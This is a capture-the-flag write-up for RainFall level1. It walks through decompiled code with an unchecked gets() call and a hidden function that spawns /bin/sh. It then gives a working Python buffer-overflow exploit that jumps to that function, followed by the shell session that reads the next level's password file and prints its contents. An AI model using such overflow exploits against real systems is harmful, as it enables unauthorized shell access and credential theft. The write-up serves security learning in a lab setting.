## Level1

In this level we have a binary `level1`. When we execute it, it wait for an input, then when we provide it, it print nothing 
```bash
level1@RainFall:~$ ./level1 
ssdf
level1@RainFall:~$ 
```

## Analysis

this is the main of the binary
```c
void main(void)

{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```

As we can see theire is a variable `local_50`, and the function `gets()` is call with the variable `local_50` as input (without verification).

So i look for an other functions use by this binary and i see a function named `run`
```c
void run(void)

{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```
as we can see this function give us the access to a terminal

## Exploitation

Here we can exploat this weakness by overflow the the variable `local_50` then forced to run the `run` function.


To overflow the variable `local_50` we know that it wait for a string less than 76 charactor and make him call the `run` function.
thank to ghidra i know that the address of `run` is `08048444`

So i made a python script to overflow the `local_50`:
```python
import struct

my_var = b"A" * 76
my_var += struct.pack("<I", 0x08048444)
print(my_var)
```
then i use the print of script as input for my binary
```bash
level1@RainFall:~$ python /tmp/my_exploat.py | ./level1 
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$ 
```
As we can see our `run` is successfuly executed, but the `/bin/sh`
is immaedialtly shotdown after the end of the execution.
That mean we have to find a way to keep it open even after the execution.

That why i save the print of this script in a file
```bash
python /tmp/my_exploat.py > /tmp/my_exploat
```
Then i execute my binary with my file as input and the big point it that i use `cat -` to keep it open.
```bash
level1@RainFall:~$ cat /tmp/my_exploat - | ./level1 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```


## Conclusion
So this level have a buffer overflow weakness because it don't check the size of `local_50` before to use it in `gets()`.

